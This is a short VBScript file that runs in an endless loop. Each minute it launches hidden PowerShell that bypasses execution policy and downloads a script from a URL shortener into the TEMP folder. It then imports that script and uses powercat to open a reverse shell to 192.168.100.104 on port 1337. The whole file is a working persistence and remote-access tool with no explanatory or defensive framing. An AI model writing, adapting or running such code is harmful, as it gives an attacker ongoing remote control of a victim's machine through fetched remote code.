Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")

Do while True:
	ncShell.Run "powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c 192.168.100.104 -p 1337 -e powershell", 0, true
	WScript.Sleep(60000)
loop
